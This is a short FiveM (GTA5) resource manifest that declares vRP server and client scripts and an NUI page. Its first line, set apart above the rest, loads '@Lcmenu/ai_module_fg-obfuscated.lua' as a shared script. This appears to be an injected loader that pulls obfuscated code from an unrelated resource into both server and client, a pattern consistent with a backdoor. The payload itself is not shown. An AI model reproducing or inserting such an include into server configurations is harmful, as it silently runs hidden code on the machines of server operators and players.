shared_script '@Lcmenu/ai_module_fg-obfuscated.lua'


fx_version "adamant"
game "gta5" 

server_scripts {
   "@vrp/lib/utils.lua",
   "server.lua"
}

client_scripts {
   "@vrp/lib/utils.lua",
   "client.lua"
}

files {
   "nui/**/*",
}
ui_page "nui/index.html"